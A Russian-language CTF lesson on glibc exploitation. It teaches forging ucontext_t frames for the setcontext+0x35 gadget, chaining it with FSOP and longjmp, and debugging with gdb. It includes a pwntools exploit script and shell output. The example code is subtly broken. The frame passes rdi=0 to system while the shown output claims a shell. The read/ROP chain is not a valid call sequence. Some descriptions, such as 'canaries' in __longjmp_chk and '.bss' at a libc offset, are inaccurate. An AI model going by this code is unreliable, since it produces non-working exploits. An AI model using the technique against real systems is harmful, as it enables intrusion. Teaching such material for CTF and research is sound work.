---
id: pwn-signal-frame-forgery
title: "Подделка сигнальных фреймов и setcontext-цепочки"
category: pwn
parent: pwn-signal-handlers
difficulty: expert
order: 2
tags: [srop, ucontext, setcontext, sigframe, fsop, glibc]
prerequisites: [pwn-sigreturn-exploit]
useful_for:
  - "CTF Pwn категория"
  - "Modern glibc exploitation"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Учимся подделывать ucontext и использовать setcontext+0x35 как «SROP без сигналов», обходить проверки ядра и связывать с FSOP."
---

SROP через `rt_sigreturn` — не единственный способ загрузить регистры из памяти. libc содержит функцию `setcontext()`, которая делает почти то же самое: читает `ucontext_t` из переданного указателя и восстанавливает регистры, включая `rsp` и `rip`. Компиляторы часто встраивают её, а в glibc 2.29+ появился знаменитый гаджет `setcontext+0x35`, который берёт контекст из `rdx`. Это даёт «SROP без сигналов» — удобно, когда сигналов нет вовсе.

В этом уроке мы разберём структуру `ucontext_t`, научимся подделывать её вручную и через pwntools, посмотрим, какие проверки остались в modern glibc, и свяжем технику с перезаписью `_IO_FILE` (FSOP).

## ucontext_t и mcontext_t

`ucontext_t` — часть POSIX-API, описывающая контекст процесса. На x86-64 интересующая нас часть — `uc_mcontext`, внутри которой `gregs[]` хранит регистры в фиксированном порядке.

| Поле | Смещение (x86-64) | Значение |
|---|---|---|
| uc_flags | 0x00 | флаги контекста |
| uc_link | 0x08 | указатель на предыдущий контекст |
| uc_stack | 0x10 | стек (ss_sp, ss_flags, ss_size) |
| uc_mcontext.gregs[REG_R8] | 0x28 | r8 |
| uc_mcontext.gregs[REG_R9] | 0x30 | r9 |
| uc_mcontext.gregs[REG_R10] | 0x38 | r10 |
| uc_mcontext.gregs[REG_RDI] | 0x68 | rdi |
| uc_mcontext.gregs[REG_RSI] | 0x70 | rsi |
| uc_mcontext.gregs[REG_RDX] | 0x88 | rdx |
| uc_mcontext.gregs[REG_RAX] | 0x90 | rax |
| uc_mcontext.gregs[REG_RSP] | 0xa0 | rsp |
| uc_mcontext.gregs[REG_RIP] | 0xa8 | rip |

Функция `setcontext(ucp)` читает эти поля и переключает контекст. Внутри неё есть последовательность, которая загружает `rsp` и `rip` из структуры — именно её и используют как гаджет.

## Гаджет setcontext+0x35

В glibc 2.29 гаджет выглядит так (упрощённо):

```asm
setcontext+0x35:
    mov    rsp, [rdx+0xa0]   ; новый стек
    mov    rbx, [rdx+0x80]
    mov    rbp, [rdx+0x78]
    mov    r12, [rdx+0x48]
    ...
    mov    rcx, [rdx+0xa8]   ; rip
    push   rcx
    ret                      ; прыжок на rip
```

Ключевое: контекст берётся из `rdx`, а не из `rdi`, как в обычном `setcontext`. Поэтому цепочка строится так: ROP-примитив кладёт адрес `setcontext+0x35` в `rip`, а в `rdx` — указатель на подделанный `ucontext_t`. Дальше управление уходит туда, куда скажет `ucontext`.

## Инструменты и команды

```bash
# найдём setcontext и смещение гаджета
readelf -s libc.so.6 | grep setcontext
objdump -d libc.so.6 | grep -A40 '<setcontext@@' | head -50

# ищем гаджет автоматически
ROPgadget --binary libc.so.6 | grep "mov rsp, \[rdx"
# 0x0000000000052185 : mov rsp, [rdx + 0xa0] ; ... ; ret

# через one_gadget проверим, есть ли подходящий вызов
one_gadget libc.so.6

# в pwntools получить адрес гаджета
python3 -c "from pwn import *; l=ELF('libc.so.6'); print(hex(next(l.search(asm('mov rsp, [rdx+0xa0]')))))"
```

Команда `readelf -s` даёт адрес символа `setcontext`, а `ROPgadget` — смещение конкретной последовательности. В pwntools `l.search(asm(...))` находит байтовую сигнатуру напрямую, что удобно, когда символ отсутствует (stripped libc).

## Разобранный пример: подделка контекста

Пусть есть переполнение и утечка libc. Цель — вызвать `system("/bin/sh")` без ROP-гаджетов `pop rdi`, используя только `setcontext`.

```python
from pwn import *
context.arch = 'amd64'

libc = ELF('./libc.so.6')
setcontext = libc.sym['setcontext'] + 0x35
system = libc.sym['system']

io = process('./chall')
# ... утечка libc, вычисление base ...
libc.address = leak - libc.sym['puts']

# ucontext лежит в .bss, который мы контролируем через read
uc = libc.address + 0x1ee000          # цель записи
frame = SigreturnFrame()               # pwntools умеет собирать ucontext-совместимо
frame.rax = 0
frame.rdi = 0
frame.rsi = uc + 0x200
frame.rdx = 0x100
frame.rsp = uc + 0x200
frame.rip = system

rop = flat(
    libc.sym['read'], uc, uc, 0x100,   # читаем кадр в .bss
    setcontext,                        # rdx уже указывает на кадр
)
```

Важно: `setcontext+0x35` читает кадр из `rdx`. В приведённой цепочке `read` возвращает управление, а `rdx` после него равен длине чтения — поэтому на практике `rdx` выставляют отдельным гаджетом (`pop rdx; ret`) или через `read` с точной длиной. Затем `rip = setcontext+0x35` переключает контекст на `system`, чей аргумент берётся из `rdi` подделанного кадра.

Ожидаемый результат:

```
[*] leaked libc: 0x7f3a...
[*] setcontext+0x35 @ 0x7f3a...2185
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

## Обход проверок в modern glibc

В glibc 2.29+ `setcontext` был изменён: проверка `uc_mcontext` стала строже, а часть кода переписана на новый набор инструкций. Начиная с 2.32 гаджет `setcontext+0x35` в некоторых сборках выглядит иначе, и `rdx` может не содержать контекст. Практические обходы:

- искать альтернативные гаджеты (`mov rsp, [rdx+X]`, `mov rsp, [rax+X]`) через `ROPgadget`;
- использовать `_IO_wfile_jumps` и FSOP вместо `setcontext`;
- комбинировать с `longjmp`/`__longjmp_chk`, который тоже восстанавливает контекст.

## Связка с FSOP

Самый популярный современный вариант: перезаписать `_IO_FILE` так, чтобы виртуальный вызов привёл к `setcontext+0x35`, а `rdx` указывал на ваш `ucontext`. Это «FSOP + SROP» и фактически стандарт для modern glibc. Детали — в ветке `pwn-fsop` и `pwn-io-file-internals`.

Схема цепочки такая. Сначала мы получаем произвольную запись (например, через tcache poisoning) и переписываем `_IO_2_1_stdout_` так, чтобы при `fflush` или `exit` вызвался нужный vtable-метод. Затем поле, которое интерпретируется как аргумент, указывает на наш `ucontext` в контролируемой памяти. Когда libc вызывает `setcontext+0x35`, контекст загружается, `rsp` и `rip` переключаются, и мы получаем полный контроль. Прелесть в том, что нам не нужны ни сигналы, ни `pop rdi` — всё берётся из подделанной структуры.

Отдельно стоит запомнить, что `_IO_wfile_jumps` и связанные wide-таблицы дают дополнительные пути: они вызываются в тех же условиях, но с другим набором аргументов, что иногда удобнее. Комбинируйте: FSOP выбирает, **когда** произойдёт переключение, а `setcontext` — **куда**.

## Отладка подделки контекста

Подделка контекста нестабильна к смещениям, поэтому отлаживайте так же методично, как SROP:

```bash
gdb -q ./chall
(gdb) b *setcontext+0x35
(gdb) run < payload
(gdb) info registers rdx rsp rip
# rdx должен указывать на ваш ucontext
(gdb) x/24gx $rdx           # проверяем gregs: rdi, rsi, rdx, rax, rsp, rip
(gdb) ni                    # пошагово до ret
(gdb) info registers        # регистры должны взяться из структуры
```

Если `rdx` не указывает на контекст — значит цепочка ROP не выставила его. Если `rsp` в кадре кривой — ядро не при чём, вы просто ошиблись в структуре. Часто полезно распечатать `bytes(frame)` и найти в дампе памяти ожидаемые байты: так вы убедитесь, что кадр реально записан туда, куда указывает `rdx`, и ничем не перекрыт.

## longjmp и __longjmp_chk: ещё один способ переключить контекст

`setcontext` — не единственная функция, восстанавливающая регистры из памяти. `longjmp(env, val)` читает `jmp_buf` и переключает контекст: загружает `rsp`, `rbp`, `rip` и (в `__longjmp_chk`) проверяет, что новый стек «выше» старого. `jmp_buf` на x86-64 — это, по сути, массив регистров, где хранятся `rbx`, `rbp`, `r12`–`r15`, `rsp`, `rip`. Если атакующий контролирует `jmp_buf`, он контролирует и переключение.

Гаджет на базе `longjmp` встречается в задачах реже, чем `setcontext`, но бывает единственным доступным. Отличие от `setcontext`: `longjmp` дополнительно проверяет канареечные значения внутри `jmp_buf` (в `__longjmp_chk`) и валидирует `rsp`. Это усложняет подделку, но не делает её невозможной — нужно сохранить канарейки (они находятся в libc) или использовать вариант без проверки.

Практический совет: ищите в бинаре вызовы `setjmp`/`longjmp` (см. `objdump | grep longjmp`) и смотрите, где лежит `jmp_buf`. Если он на стеке и стек переполняем — это потенциальная точка переключения контекста. Комбинируйте с частичной перезаписью (`pwn-partial-overwrite`), если не знаете полного адреса.

## Частые ошибки

- **Путать `rdi` и `rdx`.** Обычный `setcontext` берёт контекст из `rdi`, а популярный гаджет `+0x35` — из `rdx`.
- **Неверное смещение.** В разных сборках libc `setcontext+0x35` отличается; всегда проверяйте `ROPgadget`.
- **Стек-указатель в кадре.** `rsp` в подделанном контексте должен указывать на валидную записываемую память.
- **Требование выравнивания.** Некоторые инструкции (`movaps`) требуют 16-байтового выравнивания `rsp`, иначе `SIGSEGV`.
- **Забыть про `uc_flags`.** Нулевые флаги обычно безопасны, но некоторые сборки проверяют их значения.

## Что дальше / решение

- Соберите `ucontext` вручную (без `SigreturnFrame`) — так вы поймёте каждое поле.
- Изучите `pwn-io-file-internals`: FSOP даёт естественный путь к `setcontext`.
- Сравните `setcontext` с `rt_sigreturn` (см. `pwn-sigreturn-exploit`) и выберите под задачу.
- Для kernel-целей посмотрите `pwn-kernel-rop` — там контекст восстанавливается иначе (KPTI trampoline).

## Справочные таблицы

| Регистр | Смещение в ucontext |
|---|---|
| rdi | 0x68 |
| rsi | 0x70 |
| rdx | 0x88 |
| rax | 0x90 |
| rsp | 0xa0 |
| rip | 0xa8 |

| Гаджет | Источник контекста |
|---|---|
| setcontext | rdi |
| setcontext+0x35 | rdx |
| __longjmp_chk | rdi |

## Квиз

```quiz
- question: "Откуда популярный гаджет setcontext+0x35 берёт ucontext?"
  options:
    - "Из rdi"
    - "Из rdx"
    - "Из rsi"
    - "Из стека"
  answer: 1
  explanation: "Именно в rdx-варианте контекст читается из rdx, что удобно для ROP."
- question: "Что восстанавливает setcontext из ucontext_t?"
  options:
    - "Только rip"
    - "Регистры, включая rsp и rip"
    - "Только флаги"
    - "Таблицу GOT"
  answer: 1
  explanation: "setcontext загружает регистры из gregs[], в том числе rsp и rip."
- question: "Как обходят изменения setcontext в modern glibc?"
  options:
    - "Ищут альтернативные гаджеты или используют FSOP/_IO_wfile"
    - "Отключают ASLR"
    - "Пересобирают ядро"
    - "Меняют пароль"
  answer: 0
  explanation: "Альтернативные гаджеты и FSOP обходят изменившееся окружение."
```

## Где пригодится

- **CTF:** задачи на FSOP+setcontext в modern glibc.
- **Bug bounty:** баги в контекстных переключениях и потоках.
- **Пентест:** обход hardening glibc.
- **Работа:** понимание ucontext и переключения контекстов.
